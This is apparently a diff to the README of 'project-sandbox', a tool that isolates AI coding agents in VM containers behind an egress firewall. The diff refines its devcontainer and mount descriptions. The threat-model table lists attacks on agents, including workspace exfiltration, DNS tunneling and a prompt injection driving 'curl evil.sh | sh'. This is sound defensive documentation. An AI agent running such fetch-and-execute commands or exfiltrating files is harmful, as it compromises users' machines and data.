@@ -2,7 +2,7 @@
 
 `project-sandbox` runs Claude Code, Codex CLI, OpenCode, GitHub Copilot CLI, or a plain Bash shell inside per-project Linux containers managed by Apple's [`container`](https://github.com/apple/container) runtime. Each container runs in its own VM with hardware-enforced isolation, so the box itself is the security boundary — the agents are configured to operate freely inside it.
 
-The tool generates a derived image, sanitized agent configs, an egress firewall, and a parallel devcontainer specification so the same sandbox is reachable from the Python CLI, VS Code, Cursor, JetBrains Gateway, GitHub Codespaces, or any Docker-compatible devcontainer client.
+The tool generates a derived image, sanitized agent configs, an egress firewall, and a parallel devcontainer specification so the same sandbox is reachable from the Python CLI or from local devcontainer clients.
 
 ## What it does end-to-end
 
@@ -91,7 +91,7 @@ Generate the devcontainer without building or running anything:
 uv run project-sandbox /absolute/path/to/repo python:3.12-slim
 ```
 
-This is useful for repos whose owners do not have `apple/container` installed but want the sandboxed agent environment for IDE or Codespaces use.
+This is useful for repos whose owners do not have `apple/container` installed but want the sandboxed agent environment in a local devcontainer-capable IDE. Remote devcontainer services such as Codespaces need additional adaptation because the generated spec uses local `.project-sandbox/` files, absolute host credential staging under `/tmp/project-sandbox-<uid>/...`, and firewall capabilities (`NET_ADMIN`/`NET_RAW`) that may not be available remotely.
 
 ## Unsupervised (fire-and-forget) sessions
 
@@ -134,8 +134,8 @@ Customize:
 
 | Threat | Mitigation |
 |---|---|
-| Agent reads `~/.ssh`, `~/Library`, etc. | VM boundary (`apple/container` `Virtualization.framework`); only `/workspace` is mounted. |
-| Agent deletes the wrong project directory | Only the project path is mounted; everything else lives in the disposable VM. |
+| Agent reads `~/.ssh`, `~/Library`, etc. | VM boundary (`apple/container` `Virtualization.framework`); arbitrary host home directories are not mounted by default. |
+| Agent deletes the wrong project directory | The workspace, generated config, staged Claude credentials, selected agent config directories, optional `--mount` entries, and worktree-mode `.git` metadata are the intentional host mounts; everything else lives in the disposable VM. |
 | Agent exfiltrates the workspace to an arbitrary server | iptables egress allowlist (default DROP + domain whitelist) for both IPv4 and IPv6. |
 | DNS tunneling exfiltration | DNS restricted to the in-VM resolver only. |
 | Prompt injection drives `curl evil.sh \| sh` | Blocked unless the C2 host is on the allowlist. |
@@ -162,7 +162,7 @@ The tool does **not** protect against:
 ## Limitations
 
 - Base images, including the final stage of a Dockerfile passed with `--dockerfile`, must be Debian or Ubuntu based — the firewall depends on `apt` packages including `aggregate`, which Alpine does not ship.
-- Apple `container` is required for direct Python CLI runs. The generated `.devcontainer/` works with any Docker-compatible runtime (Docker Desktop, OrbStack, Codespaces).
+- Apple `container` is required for direct Python CLI runs. The generated `.devcontainer/` targets local Docker-compatible runtimes such as Docker Desktop or OrbStack; remote services may require rewriting local mounts and relaxing or replacing firewall capability requirements.
 - `--branch` (worktree mode) creates a git worktree on the given branch (creating it if it doesn't exist), mounts the worktree at `/workspace`, and bind-mounts the main repo's `.git/` so `git` works correctly inside the container. After the session, `--after-session` controls whether to merge, rebase, open a PR, or do nothing. Note: jj repos and worktree-of-worktree setups are not yet supported.
 - `jj` is installed in the container and configured with the same global name/email identity passed to Git, but jj-native repos are not yet supported by `--branch`.
 
